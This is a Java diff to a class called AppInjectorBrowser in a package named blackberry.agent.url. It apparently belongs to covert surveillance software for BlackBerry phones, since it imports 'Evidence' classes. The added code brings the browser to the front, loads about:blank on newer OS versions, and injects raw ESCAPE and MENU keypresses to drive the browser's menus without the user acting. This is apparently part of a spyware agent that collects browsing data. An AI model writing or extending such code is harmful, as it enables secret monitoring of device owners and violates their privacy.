@@ -9,10 +9,12 @@
 
 package blackberry.agent.url;
 
+import net.rim.blackberry.api.browser.Browser;
 import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.Device;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
@@ -88,34 +90,43 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
             return false;
         }
 
+        //TODO: togliere
+        //Backlight.enable(true);
+                
         if (tries % 2 == 0) {
-          //#ifdef DEBUG
+            //#ifdef DEBUG
             debug.trace("callMenuByKey press escape key, try: " + tries);
             //#endif
             KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
             //KeyInjector.trackBallRawClick();
         }
         
+        Browser.getDefaultSession().showBrowser(); 
+        
+        if(Device.getInstance().atLeast(6, 0)){  
+            //#ifdef DEBUG
+            debug.trace("callMenuByKey, OS > 6, display blank");
+            //#endif
+            Browser.getDefaultSession().displayPage("about:blank");
+            Utils.sleep(1000);
+        }
+
         //#ifdef DEBUG
         debug.trace("callMenuByKey press menu key, try: " + tries);
         //#endif
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         Utils.sleep(delay + tries * 20);
-        if (true) {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressRawKey");
-            //#endif
-            KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        } else {
-            //#ifdef DEBUG
-            debug.trace("callMenuByKey: pressKey");
-            //#endif
-            KeyInjector.pressKey(menu.toString().toLowerCase().charAt(0));
-        }
+
+        //#ifdef DEBUG
+        debug.trace("callMenuByKey: pressRawKey");
+        //#endif
+        KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
+
         Utils.sleep(delay + tries * 20);
-        //KeyInjector.trackBallRawClick();
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
         
+        menu.firstTime();
+
         if (screen != null) {
             screen.close();
         }
